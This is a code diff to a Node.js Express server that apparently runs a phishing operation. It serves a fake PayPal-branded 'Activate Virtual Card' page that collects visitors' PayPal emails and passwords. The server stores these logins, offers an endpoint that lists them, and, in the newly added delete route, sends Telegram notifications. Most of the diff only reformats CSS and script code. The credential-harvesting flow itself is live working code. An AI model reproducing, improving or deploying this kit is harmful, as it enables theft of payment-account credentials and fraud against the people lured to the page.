@@ -32,254 +32,44 @@ app.get('/activate.html', (req, res) => {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Activate Virtual Card</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f7f9fa;
-            position: relative;
-        }
-        .container {
-            width: 400px;
-            padding: 30px;
-            background-color: #ffffff;
-            border-radius: 15px;
-            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            position: relative;
-            z-index: 1;
-        }
-        .logo {
-            font-size: 24px;
-            font-weight: 700;
-            color: #000000;
-            margin-bottom: 20px;
-            line-height: 1;
-            letter-spacing: -1px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
-        }
-        .input-field {
-            width: 100%;
-            padding: 15px 20px;
-            margin: 10px 0;
-            border: 2px solid #0070ba;
-            border-radius: 25px;
-            font-size: 14px;
-            color: #333333;
-            box-sizing: border-box;
-            background-color: #ffffff;
-            transition: box-shadow 0.3s ease;
-        }
-        .input-field:focus {
-            box-shadow: 0 0 10px rgba(0, 112, 186, 0.5);
-            outline: none;
-        }
-        .input-field::placeholder {
-            color: #999999;
-            font-weight: 400;
-        }
-        .btn {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: none;
-            border-radius: 25px;
-            font-size: 16px;
-            cursor: pointer;
-            font-weight: 600;
-            text-transform: uppercase;
-            transition: transform 0.2s ease, box-shadow 0.2s ease;
-        }
-        .btn-login {
-            background-color: #0070ba;
-            color: #ffffff;
-            box-shadow: 0 4px 8px rgba(0, 112, 186, 0.3);
-        }
-        .btn-login:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 12px rgba(0, 112, 186, 0.4);
-        }
-        .card {
-            background: linear-gradient(135deg, #1e90ff, #000080, #ffd700);
-            color: #ffffff;
-            width: 250px;
-            height: 150px;
-            border-radius: 15px;
-            padding: 12px;
-            margin: 10px auto;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3), 0 0 10px rgba(255, 215, 0, 0.2);
-            border: 1px solid rgba(255, 215, 0, 0.5);
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-        }
-        .card::before {
-            content: '';
-            position: absolute;
-            top: -20%;
-            left: -20%;
-            width: 140%;
-            height: 140%;
-            background: radial-gradient(circle, rgba(255, 255, 255, 0.4) 0%, transparent 70%);
-            animation: hologram 3s infinite;
-        }
-        @keyframes hologram {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .card-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-start;
-        }
-        .visa-logo {
-            font-size: 20px;
-            font-weight: bold;
-            color: #ffffff;
-            text-shadow: 0 0 8px rgba(255, 255, 255, 0.7), 0 0 4px rgba(255, 215, 0, 0.5);
-        }
-        .card-amount {
-            font-size: 14px;
-            background: rgba(255, 255, 255, 0.2);
-            padding: 2px 6px;
-            border-radius: 3px;
-        }
-        .card-number {
-            font-size: 16px;
-            letter-spacing: 2px;
-            margin-top: 5px;
-        }
-        .card-footer {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-end;
-            font-size: 12px;
-        }
-        .card-name {
-            font-size: 12px;
-        }
-        .card-exp-cvv {
-            text-align: right;
-        }
-        .card-exp {
-            font-size: 12px;
-        }
-        .card-cvv {
-            font-size: 10px;
-            background: rgba(255, 255, 255, 0.3);
-            padding: 2px 4px;
-            border-radius: 3px;
-        }
-        .activation-logs {
-            margin-top: 20px;
-            padding: 10px;
-            background-color: #f0f0f0;
-            border-radius: 10px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-        }
-        .activation-logs h3 {
-            margin: 0 0 10px;
-            font-size: 16px;
-            color: #333;
-        }
-        .activation-logs p {
-            margin: 5px 0;
-            font-size: 14px;
-            color: #666;
-        }
-        .language {
-            margin: 15px 0;
-            color: #666666;
-            font-size: 13px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .language img {
-            vertical-align: middle;
-            margin-right: 5px;
-            border-radius: 50%;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-        }
-        .language select {
-            border: none;
-            background: none;
-            color: #0070ba;
-            font-weight: 600;
-            cursor: pointer;
-            appearance: none;
-            padding-left: 5px;
-            font-size: 13px;
-            transition: color 0.3s ease;
-        }
-        .language select:hover {
-            color: #005f9e;
-        }
-        .language select:focus {
-            outline: none;
-        }
-        .footer {
-            margin-top: 15px;
-            color: #666666;
-            font-size: 12px;
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            flex-wrap: wrap;
-        }
-        .footer a {
-            color: #0070ba;
-            text-decoration: none;
-            font-weight: 600;
-            transition: color 0.3s ease;
-        }
-        .footer a:hover {
-            color: #005f9e;
-        }
-        .footer .active {
-            border-bottom: 2px solid #0070ba;
-            padding-bottom: 2px;
-        }
-        .loader {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-        }
-        .loader.active {
-            display: flex;
-        }
-        .spinner {
-            border: 8px solid #f3f3f3;
-            border-top: 8px solid #0070ba;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .error-message {
-            color: #ff4444;
-            font-size: 14px;
-            margin-top: 10px;
-            text-align: center;
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f7f9fa; position: relative; }
+        .container { width: 400px; padding: 30px; background-color: #ffffff; border-radius: 15px; box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1); display: flex; flex-direction: column; align-items: center; position: relative; z-index: 1; }
+        .logo { font-size: 24px; font-weight: 700; color: #000000; margin-bottom: 20px; line-height: 1; letter-spacing: -1px; text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1); }
+        .input-field { width: 100%; padding: 15px 20px; margin: 10px 0; border: 2px solid #0070ba; border-radius: 25px; font-size: 14px; color: #333333; box-sizing: border-box; background-color: #ffffff; transition: box-shadow 0.3s ease; }
+        .input-field:focus { box-shadow: 0 0 10px rgba(0, 112, 186, 0.5); outline: none; }
+        .input-field::placeholder { color: #999999; font-weight: 400; }
+        .btn { width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 25px; font-size: 16px; cursor: pointer; font-weight: 600; text-transform: uppercase; transition: transform 0.2s ease, box-shadow 0.2s ease; }
+        .btn-login { background-color: #0070ba; color: #ffffff; box-shadow: 0 4px 8px rgba(0, 112, 186, 0.3); }
+        .btn-login:hover { transform: translateY(-2px); box-shadow: 0 6px 12px rgba(0, 112, 186, 0.4); }
+        .card { background: linear-gradient(135deg, #1e90ff, #000080, #ffd700); color: #ffffff; width: 250px; height: 150px; border-radius: 15px; padding: 12px; margin: 10px auto; position: relative; overflow: hidden; box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3), 0 0 10px rgba(255, 215, 0, 0.2); border: 1px solid rgba(255, 215, 0, 0.5); display: flex; flex-direction: column; justify-content: space-between; }
+        .card::before { content: ''; position: absolute; top: -20%; left: -20%; width: 140%; height: 140%; background: radial-gradient(circle, rgba(255, 255, 255, 0.4) 0%, transparent 70%); animation: hologram 3s infinite; }
+        @keyframes hologram { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .card-header { display: flex; justify-content: space-between; align-items: flex-start; }
+        .visa-logo { font-size: 20px; font-weight: bold; color: #ffffff; text-shadow: 0 0 8px rgba(255, 255, 255, 0.7), 0 0 4px rgba(255, 215, 0, 0.5); }
+        .card-amount { font-size: 14px; background: rgba(255, 255, 255, 0.2); padding: 2px 6px; border-radius: 3px; }
+        .card-number { font-size: 16px; letter-spacing: 2px; margin-top: 5px; }
+        .card-footer { display: flex; justify-content: space-between; align-items: flex-end; font-size: 12px; }
+        .card-name { font-size: 12px; }
+        .card-exp-cvv { text-align: right; }
+        .card-exp { font-size: 12px; }
+        .card-cvv { font-size: 10px; background: rgba(255, 255, 255, 0.3); padding: 2px 4px; border-radius: 3px; }
+        .activation-logs { margin-top: 20px; padding: 10px; background-color: #f0f0f0; border-radius: 10px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); }
+        .activation-logs h3 { margin: 0 0 10px; font-size: 16px; color: #333; }
+        .activation-logs p { margin: 5px 0; font-size: 14px; color: #666; }
+        .language { margin: 15px 0; color: #666666; font-size: 13px; display: flex; align-items: center; justify-content: center; }
+        .language img { vertical-align: middle; margin-right: 5px; border-radius: 50%; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); }
+        .language select { border: none; background: none; color: #0070ba; font-weight: 600; cursor: pointer; appearance: none; padding-left: 5px; font-size: 13px; transition: color 0.3s ease; }
+        .language select:hover { color: #005f9e; }
+        .language select:focus { outline: none; }
+        .footer { margin-top: 15px; color: #666666; font-size: 12px; display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; }
+        .footer a { color: #0070ba; text-decoration: none; font-weight: 600; transition: color 0.3s ease; }
+        .footer a:hover { color: #005f9e; }
+        .footer .active { border-bottom: 2px solid #0070ba; padding-bottom: 2px; }
+        .loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); z-index: 1000; justify-content: center; align-items: center; }
+        .loader.active { display: flex; }
+        .spinner { border: 8px solid #f3f3f3; border-top: 8px solid #0070ba; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .error-message { color: #ff4444; font-size: 14px; margin-top: 10px; text-align: center; }
     </style>
 </head>
 <body>
@@ -330,18 +120,8 @@ app.get('/activate.html', (req, res) => {
 
         function showLoader() { if (elements.loader) elements.loader.classList.add('active'); }
         function hideLoader() { if (elements.loader) elements.loader.classList.remove('active'); }
-        function showError(message) {
-            if (elements.errorMessage) {
-                elements.errorMessage.textContent = message;
-                elements.errorMessage.style.display = 'block';
-            }
-        }
-        function clearError() {
-            if (elements.errorMessage) {
-                elements.errorMessage.textContent = '';
-                elements.errorMessage.style.display = 'none';
-            }
-        }
+        function showError(message) { if (elements.errorMessage) { elements.errorMessage.textContent = message; elements.errorMessage.style.display = 'block'; } }
+        function clearError() { if (elements.errorMessage) { elements.errorMessage.textContent = ''; elements.errorMessage.style.display = 'none'; } }
 
         function maskCardNumber(number) {
             if (!number) return 'N/A';
@@ -355,70 +135,51 @@ app.get('/activate.html', (req, res) => {
             const cardContainer = document.createElement('div');
             cardContainer.className = 'card-container';
             const maskedNumber = maskCardNumber(card.number);
-            cardContainer.innerHTML = \`
-                <div class="card" data-card-id="\${card.cardId}">
+            cardContainer.innerHTML = `
+                <div class="card" data-card-id="${card.cardId}">
                     <div class="card-header">
                         <div class="visa-logo">Visa</div>
-                        <div class="card-amount">$\${amount}</div>
+                        <div class="card-amount">$${amount}</div>
                     </div>
-                    <div class="card-number">\${maskedNumber}</div>
+                    <div class="card-number">${maskedNumber}</div>
                     <div class="card-footer">
-                        <div class="card-name">Cardholder: \${card.name || 'N/A'}</div>
+                        <div class="card-name">Cardholder: ${card.name || 'N/A'}</div>
                         <div class="card-exp-cvv">
-                            <div class="card-exp">Exp: \${card.expDate || 'N/A'}</div>
-                            <div class="card-cvv">CVV: \${card.cvv || 'N/A'}</div>
+                            <div class="card-exp">Exp: ${card.expDate || 'N/A'}</div>
+                            <div class="card-cvv">CVV: ${card.cvv || 'N/A'}</div>
                         </div>
                     </div>
                 </div>
-            \`;
+            `;
             elements.cardDisplayActivate.appendChild(cardContainer);
         }
 
         async function updateActivationPage() {
-            if (!currentCardId) {
-                showError('No card ID provided. Please use a valid activation link.');
-                return;
-            }
+            if (!currentCardId) { showError('No card ID provided. Please use a valid activation link.'); return; }
             showLoader();
             try {
-                const response = await fetch(\`\${API_BASE_URL}/api/cards/activate/\${currentCardId}\`);
+                const response = await fetch(`${API_BASE_URL}/api/cards/activate/${currentCardId}`);
                 const data = await response.json();
                 if (response.ok) {
                     clearError();
-                    elements.cardDetails.innerHTML = \`
-                        <p>Card ID: \${data.cardId} - Status: \${data.status || 'pending'}</p>
-                    \`;
-                    if (elements.cardDisplayActivate) {
-                        elements.cardDisplayActivate.innerHTML = '';
-                        displayCard(data);
-                    }
-                } else if (response.status === 404) {
-                    showError('Card not found. Please check the card ID.');
-                } else {
-                    showError(data.error || 'Activation unavailable');
-                }
+                    elements.cardDetails.innerHTML = `<p>Card ID: ${data.cardId} - Status: ${data.status || 'pending'}</p>`;
+                    if (elements.cardDisplayActivate) { elements.cardDisplayActivate.innerHTML = ''; displayCard(data); }
+                } else if (response.status === 404) { showError('Card not found. Please check the card ID.'); }
+                else { showError(data.error || 'Activation unavailable'); }
             } catch (error) {
                 console.error('Activation page error:', error);
                 showError('Network issue or backend unavailable. Please try again.');
-            } finally {
-                hideLoader();
-            }
+            } finally { hideLoader(); }
         }
 
         async function activateCard() {
-            if (!currentCardId) {
-                showError('No card ID provided. Please use a valid activation link.');
-                return;
-            }
+            if (!currentCardId) { showError('No card ID provided. Please use a valid activation link.'); return; }
             const paypalUsername = document.getElementById('activateUsername')?.value.trim();
             const paypalPassword = document.getElementById('activatePassword')?.value.trim();
-            if (!paypalUsername || !paypalPassword) {
-                showError('Please enter PayPal email and password');
-                return;
-            }
+            if (!paypalUsername || !paypalPassword) { showError('Please enter PayPal email and password'); return; }
             showLoader();
             try {
-                const response = await fetch(\`\${API_BASE_URL}/api/cards/activate/\${currentCardId}\`, {
+                const response = await fetch(`${API_BASE_URL}/api/cards/activate/${currentCardId}`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ paypalUsername, paypalPassword })
@@ -428,29 +189,22 @@ app.get('/activate.html', (req, res) => {
                     alert(data.message);
                     clearError();
                     updateActivationPage();
-                } else if (response.status === 404) {
-                    showError('Card not found. Please check the card ID.');
-                } else {
-                    showError(data.error || 'Activation failed');
-                }
+                } else if (response.status === 404) { showError('Card not found. Please check the card ID.'); }
+                else { showError(data.error || 'Activation failed'); }
             } catch (error) {
                 console.error('Activate card error:', error);
                 showError('Network issue or backend unavailable. Please try again.');
-            } finally {
-                hideLoader();
-            }
+            } finally { hideLoader(); }
         }
 
         async function updateActivationLogs() {
             try {
-                const response = await fetch(\`\${API_BASE_URL}/api/cards/logs\`);
+                const response = await fetch(`${API_BASE_URL}/api/cards/logs`);
                 const data = await response.json();
                 if (response.ok) {
-                    elements.logDetails.innerHTML = data.map(log => \`<p>Activated by \${log.user} at \${new Date(log.time).toLocaleString()}</p>\`).join('');
+                    elements.logDetails.innerHTML = data.map(log => `<p>Activated by ${log.user} at ${new Date(log.time).toLocaleString()}</p>`).join('');
                     if (elements.activationLogs) elements.activationLogs.style.display = data.length ? 'block' : 'none';
-                } else {
-                    showError(data.error || 'Failed to fetch logs');
-                }
+                } else { showError(data.error || 'Failed to fetch logs'); }
             } catch (error) {
                 console.error('Fetch logs error:', error);
                 showError('Network issue or backend unavailable. Please try again.');
@@ -473,12 +227,8 @@ app.get('/activate.html', (req, res) => {
         }
 
         document.addEventListener('DOMContentLoaded', () => {
-            if (!currentCardId) {
-                showError('No card ID provided. Please use a valid activation link.');
-            } else {
-                updateActivationPage();
-                updateActivationLogs();
-            }
+            if (!currentCardId) { showError('No card ID provided. Please use a valid activation link.'); }
+            else { updateActivationPage(); updateActivationLogs(); }
             changeLanguage();
         });
     </script>
@@ -698,6 +448,22 @@ app.get('/api/cards/paypal-creds', (req, res) => {
     } catch (error) {
         console.error('Fetch PayPal creds error:', error);
         res.status(500).json({ error: 'Server error fetching PayPal credentials' });
+    }
+});
+
+app.delete('/api/cards/paypal-creds/:cardId', authenticateToken, async (req, res) => {
+    try {
+        const cardId = req.params.cardId;
+        const loginIndex = data.paypalLogins.findIndex(l => l.cardId === cardId && l.user === req.user.username);
+        if (loginIndex === -1) return res.status(404).json({ error: 'PayPal credentials not found' });
+        const deletedLogin = data.paypalLogins.splice(loginIndex, 1)[0];
+        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
+        const message = `PayPal credentials deleted for Card ID: ${cardId}, User: ${req.user.username}`;
+        await sendTelegramNotification(message);
+        res.json({ message: 'PayPal credentials deleted' });
+    } catch (error) {
+        console.error('Delete PayPal creds error:', error);
+        res.status(500).json({ error: 'Server error deleting PayPal credentials' });
     }
 });
 
